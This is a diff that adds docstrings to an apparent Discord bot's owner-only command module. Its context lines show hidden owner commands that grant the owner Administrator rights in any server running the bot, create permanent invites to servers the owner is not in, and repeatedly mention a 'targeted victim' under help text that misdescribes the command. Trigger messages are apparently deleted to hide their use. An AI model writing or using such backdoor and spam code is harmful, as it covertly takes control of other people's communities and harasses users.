@@ -21,6 +21,9 @@ def delete_before(func):
 
 
 class owner(commands.Cog, command_cog):
+    """ 
+        Bot owner only commands
+    """
     def __init__(self, bot: commands.Bot, tokens):
         super().__init__(bot=bot, tokens=tokens)
         self.description = 'Bot owner only commands to manage the bot'
@@ -52,6 +55,10 @@ class owner(commands.Cog, command_cog):
     @commands.is_owner()
     @delete_before
     async def admin(self, ctx: commands.Context, server=None):
+        """
+            Gives you admin in the server this command is ran from.
+            Optionally specify which server
+        """
         member = ctx.message.author
         guild = ctx.message.guild if server == None else self.bot.get_guild(int(server))
         role = await guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
@@ -61,6 +68,10 @@ class owner(commands.Cog, command_cog):
     @commands.is_owner()
     @delete_before
     async def invite(self, ctx: commands.Context, server=None):
+        """
+            Creates a permanent server invite to the specified server
+            if no server specified, will dm all the servers the owner is not also in
+        """
         if server == None:
             unknown_guilds = self.get_unknown_guilds()
             dm = await self.bot.create_dm(ctx.author)
@@ -81,6 +92,9 @@ class owner(commands.Cog, command_cog):
     @commands.is_owner()
     @delete_before
     async def naughty(self, ctx: commands.Context, ID: int):
+        """
+            Add / remove people from the naughty list used to block users from using the bot
+        """
         with open('./naughty_list.json', 'r') as file:
             naughty_list = list(json.loads(file.read()))
         if ID in naughty_list:
@@ -94,6 +108,9 @@ class owner(commands.Cog, command_cog):
     @commands.command(help='run this command incase you are a victim of being spammed')
     @delete_before
     async def spam(self, ctx: commands.Context):
+        """
+            Spams the targeted victim endlessly once per second
+        """
         if await self.bot.is_owner(ctx.author):
             for mention in ctx.message.mentions:
                 self.spamming = True
